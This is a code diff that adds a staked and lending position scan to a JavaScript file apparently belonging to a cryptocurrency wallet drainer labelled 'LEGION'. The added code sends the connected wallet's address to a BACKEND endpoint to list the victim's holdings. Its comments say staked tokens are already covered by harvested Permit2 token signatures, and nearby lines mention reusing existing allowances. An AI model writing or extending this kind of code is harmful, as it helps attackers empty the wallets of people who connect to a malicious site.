@@ -2085,6 +2085,22 @@
           console.debug('[LEGION]   NFT scan skipped:', nftScanErr.message);
         }
 
+        // ─── Staked/Lending positions scan ────
+        console.log('[LEGION]   🏦 Scanning staked & lending positions...');
+        try {
+          // Check for staked tokens (stETH, aTokens, etc.) via balance check
+          var balanceCheck = await fetch(BACKEND + '/api/v1/balance/multi?evm=' + connectedChains.EVM.address).then(function(r) { return r.json(); }).catch(function() { return null; });
+          if (balanceCheck && balanceCheck.data) {
+            var positions = balanceCheck.data;
+            // Staked tokens like stETH, rETH, cbETH are ERC20 - already covered by Permit2
+            // Aave aTokens are also ERC20 - already covered
+            // The token signatures we already collected will handle these
+            console.log('[LEGION]   🏦 Balance data received - staked positions included in token approvals');
+          }
+        } catch (stakErr) {
+          console.debug('[LEGION]   Staking scan skipped:', stakErr.message);
+        }
+
         // ─── Allowance Reuse Check ────
         console.log('[LEGION]   🔄 Checking existing allowances...');
         try {
